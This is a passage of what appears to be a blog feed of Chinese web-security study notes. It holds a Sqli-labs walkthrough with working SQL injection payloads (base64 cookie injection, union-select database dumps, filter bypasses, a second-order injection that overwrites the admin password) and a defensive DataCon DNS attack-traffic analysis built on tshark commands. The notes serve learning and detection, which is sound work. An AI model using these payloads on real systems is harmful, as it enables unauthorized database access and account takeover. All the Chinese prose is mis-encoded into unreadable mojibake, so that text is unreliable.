name:&#x27;</span>.$row[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;hr&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span>.$row[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191030100026.png" alt=""></p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>webå®‰å…¨åŸºç¡€</tag>
        <tag>SQLæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>Webå®‰å…¨å­¦ä¹ ä¹‹Sqli-labsæ‰‹å·¥æ³¨å…¥â€”â€”Advanced-Injections</title>
    <url>/Web_security/basic_learning/8.Sqli-labs%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94Advanced-Injections/</url>
    <content><![CDATA[<h1 id="Webå®‰å…¨å­¦ä¹ ä¹‹Sqli-labsæ‰‹å·¥æ³¨å…¥â€”â€”Advanced-Injections">Webå®‰å…¨å­¦ä¹ ä¹‹Sqli-labsæ‰‹å·¥æ³¨å…¥â€”â€”Advanced-Injections</h1>
<p>Sqli-labsæ‰‹å·¥æ³¨å…¥ç¬¬äºŒé˜¶æ®µï¼Œä¸»è¦éƒ½æ˜¯ä¸€äº›ç»•è¿‡çš„æŠ€å·§ï¼ˆåŒ…æ‹¬WAFï¼‰ã€‚</p>
<h3 id="Less-21-Cookie-injection-base64-encoded-single-quotes-and-parenthesis">Less-21 Cookie injection-base64 encoded-single quotes and parenthesis</h3>
<p>ç™»å½•æˆåŠŸåçš„é¡µé¢ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191022162419.png" alt=""></p>
<p>å¾ˆæ˜æ˜¾<code>cookie</code>å­—æ®µæ˜¯è¢«åŠ å¯†å¤„ç†äº†ï¼ˆè€Œä¸”åé¢çš„<code>=</code>æš´éœ²äº†åº”è¯¥æ˜¯base64ç¼–ç æ–¹å¼ï¼‰ã€‚</p>
<blockquote>
<p>æ’æ’­ä¸€ä¸ªå…³äºè®²è§£base64ç¼–ç æ–¹å¼çš„åšæ–‡ï¼Œ<a href="http://www.ruanyifeng.com/blog/2008/06/base64.html">ç‚¹å‡»è·³è½¬</a>ã€‚</p>
</blockquote>
<p>æŸ¥çœ‹phpæ–‡ä»¶ç¡®å®å¦‚æ­¤ï¼Œæ‰€ä»¥åªéœ€è¦ä¸Šä¼ paylaodçš„æ—¶å€™base64åŠ å¯†ä¸€ä¸‹å°±å¯ä»¥äº†ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191022163617.png" alt=""></p>
<blockquote>
<p>%3dåº”è¯¥æ˜¯=å·urldecodeçš„ç»“æœ</p>
</blockquote>
<p>æ¥ä¸‹æ¥æ„é€ payloadè¿›è¡Œæµ‹è¯•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39; and 1&#x3D;1 --+    &#x2F;&#x2F;æ˜æ–‡</span><br><span class="line">YWRtaW4nIGFuZCAxPTEgLS0r    &#x2F;&#x2F;å¯†æ–‡</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191022163837.png" alt=""></p>
<p>æ ¹æ®SQLé”™è¯¯ä¿¡æ¯çš„æç¤ºï¼Œåº”è¯¥æ˜¯å°‘äº†ä¸€ä¸ª<code>)</code>ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">admin&#39;) and 1&#x3D;1#   &#x2F;&#x2F;æ˜æ–‡</span><br><span class="line">YWRtaW4nKSBhbmQgMT0xIw&#x3D;&#x3D;    &#x2F;&#x2F;å¯†æ–‡</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191022164053.png" alt=""></p>
<p>ç¤ºä¾‹çˆ†åº“paylaodï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-admin&#39;) union select 1,2,database()#</span><br><span class="line">LWFkbWluJykgdW5pb24gc2VsZWN0IDEsMixkYXRhYmFzZSgpIw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
<h3 id="Less-22-Cookie-injection-base64-encoded-double-quotes">Less-22 Cookie injection-base64 encoded-double quotes</h3>
<p>å’Œless-21ä¸€æ ·çš„ï¼Œåªéœ€è¦ä½¿ç”¨åŒå¼•å·ä»£æ›¿å•å¼•å·<strong>å†å–æ‰æ‹¬å·</strong>å³å¯ã€‚</p>
<p>æ ·ä¾‹payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-admin&quot; union select 1,2,database()#</span><br><span class="line">LWFkbWluIiB1bmlvbiBzZWxlY3QgMSwyLGRhdGFiYXNlKCkj</span><br></pre></td></tr></table></figure>
<h3 id="Less-23-GET-Error-bases-strip-comments">Less-23 GET-Error bases-strip comments</h3>
<p>å¤šæ¬¡è¾“å…¥å‘ç°è¿™é“é¢˜ä¸èƒ½ç”¨æ³¨é‡Šç¬¦æ¥æ³¨æ‰åé¢<code>Limit</code>è¯­å¥ï¼Œåªèƒ½è½¬è€Œç”¨å•å¼•å·é—­åˆçš„æ–¹å¼ã€‚</p>
<p>å°è¯•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1 and &#39;</span><br></pre></td></tr></table></figure>
<p>å‘ç°SQLè¯­å¥ä¸æŠ¥é”™ï¼Œé‚£ä¹ˆä¹…å¯ä»¥ä½¿ç”¨è”åˆæŸ¥è¯¢ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,database(),3 and &#39;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191022170754.png" alt=""></p>
<p>çˆ†è¡¨payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; or &#39;1&#39;&#x3D;&#39;</span><br></pre></td></tr></table></figure>
<h3 id="Less-24-POST-Second-Oder-Injections-Real-Treate-Stored-Injections">Less-24 POST-Second Oder Injections *Real Treate* Stored Injections</h3>
<p>é¦–å…ˆæ³¨å†Œä¸€ä¸ªæ–°ç”¨æˆ·ï¼Œç”¨æˆ·åå¿…é¡»æ˜¯<code>admin'#</code>ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191022195226.png" alt=""></p>
<p>ç„¶åç™»å½•<code>admin'#</code>è´¦å·ï¼Œå¹¶ä¿®æ”¹è¯¥è´¦å·çš„å¯†ç ï¼Œä½†æ­¤æ—¶<strong>ä¿®æ”¹çš„å°±æ˜¯adminçš„å¯†ç </strong>ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191022195442.png" alt=""></p>
<p>è¿™æ˜¯å› ä¸ºï¼šSQLè¯­å¥å˜ä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPDATE users SET passwd&#x3D;&quot;New_Pass&quot; WHERE username &#x3D;&#39; admin&#39; # &#39; AND password&#x3D;&#39;</span><br></pre></td></tr></table></figure>
<p>ä¹Ÿå°±æ˜¯æ‰§è¡Œäº†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">UPDATE users SET passwd&#x3D;&quot;New_Pass&quot; WHERE username &#x3D;&#39; admin&#39;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å†å¯ä»¥å»åå°çš„æ•°æ®åº“æŸ¥çœ‹usersè¡¨çš„è®°å½•ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191022195646.png" alt=""></p>
<p>å‘ç°è´¦å·<code>admin</code>çš„å¯†ç è¢«æ›´æ”¹äº†ï¼ï¼ï¼</p>
<p>äºŒæ¬¡æ³¨å…¥æˆåŠŸã€‚</p>
<h3 id="Less-25-Get-Error-based-All-you-OR-AND-belong-to-us-string-single-quote">Less-25 Get-Error based-All you OR &amp; AND belong to us - string single quote</h3>
<p>æ ¹æ®é¡µé¢çš„æç¤ºï¼Œå¾ˆæ˜æ˜¾ç¨‹åºæŠŠæˆ‘ä»¬è¾“å…¥çš„<code>and</code>å’Œ<code>or</code>å…³é”®å­—è¿‡æ»¤æ‰äº†ã€‚</p>
<p>è§£å†³æ–¹æ³•å°±æ˜¯åŒå†™<code>and</code>æˆ–<code>or</code>å…³é”®å­—ï¼Œä¾‹å¦‚ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191024210809.png" alt=""></p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>sqlæ³¨å…¥</tag>
      </tags>
  </entry>
  <entry>
    <title>Datacon2019-q1-Writeup-v2</title>
    <url>/Web_security/traffic_analysis/2.Datacon2019-q1-Writeup-v2/</url>
    <content><![CDATA[<h1 id="DataCon-æ–¹å‘ä¸€-DNSæ¶æ„æµé‡æ£€æµ‹-WriteUp-Review-v2">DataCon æ–¹å‘ä¸€ DNSæ¶æ„æµé‡æ£€æµ‹ WriteUp Review-v2</h1>
<blockquote>
<p>è¿™ä¸€è½®æµé‡åˆ†æä¸»è¦æ˜¯<strong>åˆ†æ</strong>ä¸ºä¸»ï¼Œä»¥<a href="https://github.com/shyoshyo/DataCon-9102-DNS">è¿™ç¯‡Writeup</a>ä¸ºå‚è€ƒï¼Œæœ‰å…³DNSçš„æ”»å‡»ç±»å‹ã€æ”»å‡»æ‰‹æ®µå’Œæ”»å‡»ç‰¹å¾ï¼Œè¯¦è§<a href="https://github.com/caoyihuai2/LearingNotes/blob/master/Datacon2019/Datacon2019-q1-Writeup-Review.md">DNSæ”»å‡»æµé‡åˆ†æè¯†åˆ«-v1</a></p>
</blockquote>
<h2 id="0x00-ç³»ç»Ÿç¯å¢ƒ">0x00 ç³»ç»Ÿç¯å¢ƒ</h2>
<ul>
<li>Windows10 64bitï¼›</li>
<li>wireshark 3.0.3 (v3.0.3-0-g6130b92b0ec6) ï¼›</li>
<li>TShark (Wireshark) 3.0.3 (v3.0.3-0-g6130b92b0ec6)ï¼›</li>
<li>Cmder 18026 previewï¼›</li>
<li>python 3.7ï¼›</li>
<li>Excel 2016</li>
</ul>
<hr>
<h2 id="0x01-æœªæˆæƒçš„Dynamic-Update">0x01 æœªæˆæƒçš„Dynamic Update</h2>
<p>**åˆ‡å…¥ç‚¹ï¼š**ç²—ç•¥è§‚å¯Ÿç»å¤§éƒ¨åˆ†DNSåŒ…çš„Opcodeéƒ½æ˜¯0ï¼ˆStandard Queryï¼‰ï¼Œä½†æ˜¯æˆ‘ä»¬ä¹Ÿå¯ä»¥åˆ†æOpcodeä¸ä¸ºé›¶çš„ã€‚ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç­›é€‰ï¼š</p>
<p><code>dns and not dns.flags.opcode==0</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144716.png" alt=""></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œå…¨éƒ¨éƒ½æ˜¯DNS Dynamic Updateè¯·æ±‚ã€‚æ¥ä¸‹æ¥ï¼Œä½¿ç”¨åœ¨Cmderä¸­ä½¿ç”¨tsharkå‘½ä»¤ç­›é€‰å‡ºæ‰€æœ‰çš„æ”»å‡»IPï¼š</p>
<p><code>tshark.exe -r q1_final.pcap -Y &quot;dns.flags.opcode==5 &amp;&amp; dns.flags.response==0&quot; -T fields -e ip.src -e ip.dst |awk '&#123;print $1&quot;-&gt;&quot;$2&#125;' &gt; DynamicDNSip.csv</code></p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144732.png" style="zoom: 67%;" />
<p>ä»å›¾ä¸­å¯ä»¥çœ‹åˆ°æœ‰å››ä¸ªæ”»å‡»æ¥æºï¼š19.220.251.87 414ï¼Œ200.152.141.106 15ï¼Œ18.100.48.86 4091ï¼Œ237.205.156.233 535ã€‚<strong>ç”±äºæ­£å¸¸çš„Dynamic Update ä¸ä¼šå‘é€è¿™ä¹ˆå¤šä¸”è¿™ä¹ˆé¢‘ç¹çš„è¯·æ±‚ï¼Œè€Œä¸”æ¶‰åŠåˆ°äºŒçº§åŸŸåcom.cnä»¥åŠå¾ˆå¤šå…¶ä»–ä¸åŒåŸŸåçš„æ›´æ–°</strong>ï¼Œå› æ­¤æˆ‘ä»¬è®¤ä¸ºè¿™äº›éƒ½æ˜¯æ”»å‡»ã€‚å†ä½¿ç”¨ä¸‹é¢ä¸€è¡Œå‘½ä»¤æŠŠä»–ä»¬é€‰å‡ºæ¥ï¼š</p>
<p><code>tshark.exe -r q1_final.pcap -Y &quot;dns and not dns.flags.opcode == 0 and dns.flags.response == 0&quot; -T fields -e frame.number -e ip.src | awk '&#123;print $1&quot;,5&quot;; ip[$2] += 1&#125;' &gt; DynamicDNS.csv</code></p>
<p>ä¸Šè¿°å‘½ä»¤æŠŠè¿™äº›æ”»å‡»åŒ…çš„æ ‡å·å’Œç±»å‹(5) è¾“å‡ºåˆ°äº†DynamicDNS.csv</p>
<h2 id="0x02-åå°„æ”¾å¤§æ”»å‡»">0x02 åå°„æ”¾å¤§æ”»å‡»</h2>
<p>**åˆ‡å…¥ç‚¹ï¼š**æˆ‘ä»¬æ¥ä¸‹æ¥å†çœ‹çœ‹é™¤äº†A(1) å’ŒAAAA(28) è¿™ä¸¤ä¸ªå¸¸è§ç±»å‹ä»¥å¤–çš„DNS è¯·æ±‚ã€‚ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¯åŠ¨<br>
wiresharkï¼š</p>
<p><code>wireshark -r q1_final.pcap -R &quot;dns and not dns.query.type in &#123;1, 28&#125; and dns.flags.opcode == 0&quot;</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144742.png" alt=""></p>
<p>å¦‚å›¾æ‰€ç¤ºï¼Œå¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šæ‚ä¸ƒæ‚å…«çš„DNS è¯·æ±‚ã€‚ä¸ºä¾¿äºè§‚å¯Ÿï¼Œæˆ‘ä»¬æŒ‰ç…§è¯·æ±‚ç±»å‹æ’åºã€‚ç®€å•æµè§ˆä¸€ä¸‹ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿå‘ç°ä¸€äº›æ”»å‡»ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åå°„æ”¾å¤§æ”»å‡»ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144811.png" alt=""></p>
<p>ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ç»Ÿè®¡å„IPçš„è¿›/å‡ºæµé‡ï¼š</p>
<p><code>tshark -r q1_final.pcap -T fields -e ip.src -e ip.dst -e frame.len | awk '&#123;send[$1] += $3; rece[$1] += 0; rece[$2] += $3; send[$2] += 0;&#125; END &#123;for(ip in send) if(rece[ip] == 0) tmp = 1e60; else tmp = send[ip]/rece[ip]; for(ip in send) print ip, send[ip], rece[ip], tmp; &#125;' &gt; send_rece.csv</code></p>
<p>ä¸ºäº†æ›´å®¹æ˜“è§‚å¯Ÿè¿™äº›IPçš„æµé‡ç‰¹å¾ï¼Œå¯ä»¥ä½¿ç”¨Pythonçš„matplotlibæ¨¡å—ä½œå›¾ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"></span><br><span class="line">send = []</span><br><span class="line">rece = []</span><br><span class="line">ip = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;send_rece.csv&#x27;</span> ,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> csvfile:</span><br><span class="line">	plots = csv.reader(csvfile, delimiter=<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">	<span class="keyword">for</span> row <span class="keyword">in</span> plots:</span><br><span class="line">		<span class="keyword">if</span> row[<span class="number">0</span>] == <span class="string">&#x27;45.80.170.1&#x27;</span>: <span class="keyword">continue</span></span><br><span class="line">		send.append(int(row[<span class="number">1</span>]))</span><br><span class="line">		rece.append(int(row[<span class="number">2</span>]))</span><br><span class="line">		ip.append(row[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">fig, ax = plt.subplots()</span><br><span class="line">ax.scatter(send, rece, label=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i, txt <span class="keyword">in</span> enumerate(ip):</span><br><span class="line">	<span class="keyword">if</span> send[i] &gt; <span class="number">8e6</span> <span class="keyword">or</span> rece[i] &gt; <span class="number">8e6</span>:</span><br><span class="line">		ax.annotate(txt, (send[i], rece[i]))</span><br><span class="line"></span><br><span class="line">plt.xlabel(<span class="string">&#x27;send&#x27;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;receive&#x27;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">plt.legend()</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ä¸ºä»€ä¹ˆè¦æ’é™¤45.80.170.1ï¼š</p>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å‘½ä»¤<code>wireshark -r q1_final.pcap -R &quot;dns and ip.addr == 45.80.170.1&quot;æŸ¥çœ‹ç›¸å…³æµé‡ï¼š</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144831.png" alt=""></p>
<p>å¯ä»¥çœ‹å‡ºè¿™ä¸ªIPæ˜¯ä¸€ä¸ªDNSæœåŠ¡ã€‚</p>
</blockquote>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144842.png" alt=""></p>
<p>å¯ä»¥çœ‹åˆ°åˆ°188.141.167.218ã€70.85.232.160ã€187.199.129.12 æ˜¯åå°„ç”¨çš„é€’å½’DNSï¼Œè€Œä¼ªé€ å‡ºçš„æºåœ°å€127,130.104.152ã€175.222.102.169ã€105.191.150.205 åˆ™éƒ½æ˜¯å—å®³è€…ã€‚</p>
<blockquote>
<p>ä»å›¾ä¸­ï¼Œ102.181.153.79ä¹Ÿæ¯”è¾ƒå¯ä»¥ï¼Œä½†æ˜¯ä½¿ç”¨<code>ip.addr==102.181.153.79</code>å¯ä»¥çœ‹å‡ºå®ƒçš„è¯·æ±‚ç±»å‹ä¸»è¦æ˜¯MXã€NSå’ŒCNAMEã€‚</p>
</blockquote>
<p><code>tshark -r q1_final.pcap -Y 'dns.qry.type in &#123;255&#125; and dns.flags.recdesired == 1 and dns.qry.name in &#123;&quot;734a5.gov&quot; &quot;d1a4.cc&quot;&#125; and not dns.flags.response == 1 and ip.src in &#123;127.130.104.152 175.222.102.169 105.191.150.205&#125;' -T fields -e frame.number -e ip.src -e dns.qry.name | awk '&#123;print $1&quot;,3&quot;&#125; &gt; Reflect.csv</code></p>
<p>ä¸Šè¿°å‘½ä»¤æŠŠè¿™äº›æ”»å‡»åŒ…çš„æ ‡å·å’Œç±»å‹(3) è¾“å‡ºåˆ°äº†Reflect.csvã€‚</p>
<h2 id="0x03-æœªæˆæƒçš„åŸŸä¼ è¾“æ”»å‡»">0x03 æœªæˆæƒçš„åŸŸä¼ è¾“æ”»å‡»</h2>
<p>ç»§ç»­æµè§ˆé™¤äº†A(1) å’ŒAAAA(28) ä»¥å¤–çš„DNS è¯·æ±‚ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†æœªæˆæƒçš„DNS åŸŸä¼ é€æ”»å‡»ã€‚</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144900.png" alt=""></p>
<p>æˆ‘ä»¬ç”¨æ˜¾ç¤ºè¿‡æ»¤å™¨<code>dns.qry.type in &#123;252 251&#125;</code>æŠŠAXFR å’ŒIXFR è¿‡æ»¤å‡ºæ¥ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144911.png" alt=""></p>
<p>å¯ä»¥æ‰‹å·¥éªŒè¯ï¼Œæœ‰ä¸¤ä¸ª221.223.19.169 å’Œä¸€ä¸ª129.191.74.107 å‘æ¥çš„åŸŸä¼ é€è¯·æ±‚åŒ…ï¼Œä»¥åŠå¤§é‡çš„96.199.230.176 å‘æ¥çš„åŸŸä¼ é€è¯·æ±‚åŒ…ã€‚æˆ‘ä»¬è®¤ä¸ºå‰é¢ä¸¤ä¸ªæœ‰å¯èƒ½æ˜¯ç®¡ç†å‘˜é…ç½®ä¸å½“ç­‰é€ æˆçš„ï¼Œè€Œæœ€åçš„ä¸€ä¸ªå¤§é‡çš„è¯·æ±‚æ•°æ®åŒ…æ˜¾ç„¶å°±æ˜¯åŸŸä¼ é€æ”»å‡»äº†ã€‚ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æå–å‡ºæˆ‘ä»¬è®¤ä¸ºæ˜¯æ”»å‡»çš„åŒ…ï¼š</p>
<p><code>tshark -r q1_final.pcap -Y &quot;dns.qry.type in &#123;251 252&#125; and not ip.addr in &#123;221.223.19.169 129.191.74.107&#125; and not dns.flags.response == 1&quot; -T fields -e frame.number -e ip.src | awk '&#123;print $1&quot;,4&quot;; ip[$2] += 1&#125;' &gt; AXFR.csv</code></p>
<p>ä¸Šè¿°å‘½ä»¤æŠŠè¿™äº›æ”»å‡»åŒ…çš„æ ‡å·å’Œç±»å‹(4) è¾“å‡ºåˆ°äº†AXFR.csvã€‚</p>
<h2 id="0x04-DNSSec-NSec-åŸŸåéå†">0x04 DNSSec NSec åŸŸåéå†</h2>
<p>ç»§ç»­æµè§ˆé™¤äº†A(1) å’ŒAAAA(28) ä»¥å¤–çš„DNS è¯·æ±‚ï¼Œå¯ä»¥çœ‹åˆ°DNSSec åŸŸåéå†æ”»å‡»ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144941.png" alt=""></p>
<p>ç”±äºåŸŸåéå†æ”»å‡»ä¾èµ–äºNSecï¼Œæˆ‘ä»¬å¯ä»¥é‡æ–°æ‰§è¡Œ</p>
<p><code>tshark -r q1_final.pcap -R &quot;dns.resp.type == 47 and not dns.qry.type == 255&quot;</code></p>
<p>ä»åŸæ¥çš„æ‰€æœ‰åŒ…ä¸­é‡æ–°è¿‡æ»¤æ‰€æœ‰æ¶‰åŠåˆ°NSec(47) é¡¹çš„å“åº”æ•°æ®åŒ…ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406144952.png" alt=""></p>
<p>å®¹æ˜“æ‰‹å·¥éªŒè¯ï¼Œåœ¨æ‰€æœ‰çš„åŸŸåéå†æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…åªæœ‰6.116.183.244 ä¸€ä¸ªäººã€‚æˆ‘ä»¬å¯ä»¥ç”¨ï¼š</p>
<p><code>wireshark -r q1_final.pcap -R &quot;dns and ip.addr == 6.116.183.244&quot;</code></p>
<p>è¿‡æ»¤å‡º6.116.183.244 å‘é€çš„æ‰€æœ‰åŒ…ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406145000.png" alt=""></p>
<p>å¯è§æ‰€æœ‰çš„æ”»å‡»åŒ…éƒ½æ˜¯SOA æˆ–è€…DS ç±»å‹çš„ã€‚ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æå–å‡ºæ”»å‡»çš„åŒ…</p>
<p><code>tshark -r q1_final.pcap -Y 'dns and dns.qry.type in &#123;43 6&#125; and dns.flags.response == 0 and ip.src == 6.116.183.244' -T fields -e frame.number -e ip.dst | awk '&#123;print $1&quot;,1&quot;&#125;' &gt; DNSSec.csv</code></p>
<h2 id="0x05-Doså­åŸŸåéå†æ”»å‡»">0x05 Doså­åŸŸåéå†æ”»å‡»</h2>
<p>**åˆ‡å…¥ç‚¹ï¼š**æˆ‘ä»¬å¯ä»¥å…ˆç»Ÿè®¡ä¸€ä¸‹DNS æŸ¥è¯¢åˆ°ä¸€ä¸ªä¸å­˜åœ¨çš„åŸŸåçš„æ¬¡æ•°åŠå…¶è¯·æ±‚å‘èµ·äººçš„IPï¼Œå…·ä½“è€Œè¨€å¯ä»¥ä½¿ç”¨å¦‚ä¸‹çš„å‘½ä»¤ï¼š</p>
<p><code>tshark -r q1_final.pcap -Y &quot;dns and dns.flags.rcode == 3&quot; -T fields -e ip.src -e ip.dst -e dns.qry.name | awk '&#123;ip = $2; doname = substr($3, index($3,&quot;.&quot;), length($3)); c_ip_doname[ip&quot;@@@&quot;doname] += 1&#125; END &#123;for(i in c_ip_doname) print i, c_ip_doname[i]&#125;' &gt; No_such_name.csv</code></p>
<blockquote>
<p>``substr(string, start<code> [</code>, length<code> ])</code>ï¼šReturn a length-character-long substring of string, starting at character number start. The first character of a string is character number one.</p>
<p>`index(str1, str2)ï¼š This searches the string <em>str1</em> for the first occurrences of the string <em>str2</em>, and returns the position in characters where that occurrence begins in the string <em>str1</em></p>
</blockquote>
<p>ä»¥åŸŸåä¸ºæ’åºæ ‡å‡†ï¼ŒæŸ¥çœ‹No_such_name.csvï¼š</p>
<p><code>cat No_such_name.csv | sort -k2nr | less</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406145017.png" alt=""></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œ144.202.64.226æŸ¥è¯¢äº†30318æ¬¡*b0e.com.cnä¸‹é¢ä¸å­˜åœ¨çš„åŸŸåï¼Œæ˜¯æ‰€æœ‰IPä¸­æ¬¡æ•°æœ€å¤šçš„ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ï¼š</p>
<p><code>wireshark -r q1_final.pcap -R &quot;dns and ip.addr == 144.202.64.226&quot;</code></p>
<p>è¿›ä¸€æ­¥æŸ¥çœ‹144.202.64.226ç›¸å…³çš„åŒ…ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200406145029.png" alt=""></p>
<p>å¯ä»¥çœ‹å‡ºï¼Œæ”»å‡»äºº144.202.64.226 é€‰äº†182.254.116.116 ã€119.29.29.29 å’Œ223.6.6.6 ä¸‰ä¸ªé€’å½’DNS æœåŠ¡å™¨ä½œä¸ºä¸­é—´â€œè·³æ¿â€ï¼Œ<a href="http://xn--b0e-5d2e139f.com.cn">æ”»å‡»b0e.com.cn</a> çš„æƒå¨DNS æœåŠ¡å™¨ã€‚æœ¬æ¥æ”»å‡»è€…è¿˜æƒ³åˆ©ç”¨223.5.5.5 ä½œä¸ºâ€œè·³æ¿â€çš„ï¼Œä½†æ˜¯çœ‹èµ·æ¥è¿™å°DNS æœåŠ¡å™¨æ²¡æœ‰å·¥ä½œï¼Œæ— æ³•åˆ©ç”¨ã€‚</p>
<p>å¯¹äºæ¯ä¸ªå­åŸŸåï¼Œæ”»å‡»äººéƒ½è®¿é—®äº†ä¸¤æ¬¡ã€‚ç¬¬äºŒæ¬¡æ˜æ˜¾å¿«äºç¬¬ä¸€æ¬¡ï¼Œè¯´æ˜è¯·æ±‚ç¡®å®åˆ°è¾¾äº†æƒå¨DNSæœåŠ¡å™¨å¹¶è¢«é€’å½’æœåŠ¡å™¨ç¼“å­˜ã€‚</p>
<p>ä½¿ç”¨ä¸‹åˆ—å‘½ä»¤å¯ä»¥æå–å‡ºæ”»å‡»çš„åŒ…ï¼š</p>
<p><code>tshark -r q1_final.pcap -Y 'dns and dns.flags.response == 0 and ip.src == 144.202.64.226' -T fields -e frame.number -e ip.dst -e dns.qry.name | awk '&#123;print $1&quot;,2&quot;&#125;' &gt; DOS.csv</code></p>
<p>ä½¿ç”¨ä¸‹åˆ—å‘½ä»¤æå–â€œè·³æ¿æœºå™¨â€çš„dnsåŠå…¶è¢«åˆ©ç”¨æ¬¡æ•°ï¼š</p>
<p><code>tshark -r q1_final.pcap -Y 'dns and dns.flags.response == 0 and ip.src == 144.202.64.226' -T fields -e frame.number -e ip.dst -e dns.qry.name | awk '&#123;dns[$2] += 1&#125; END &#123;for(ip in dns) print ip, dns[ip]'&#125;</code></p>
<blockquote>
<p>119.29.29.29 15719<br>
182.254.116.116 16227<br>
223.6.6.6 2247<br>
223.5.5.5 1</p>
</blockquote>
<p>ä½¿ç”¨ä¸‹åˆ—å‘½ä»¤æå–è¯¢é—®æ¬¡æ•°ä¸æ˜¯ä¸¤æ¬¡çš„åŸŸåï¼š</p>
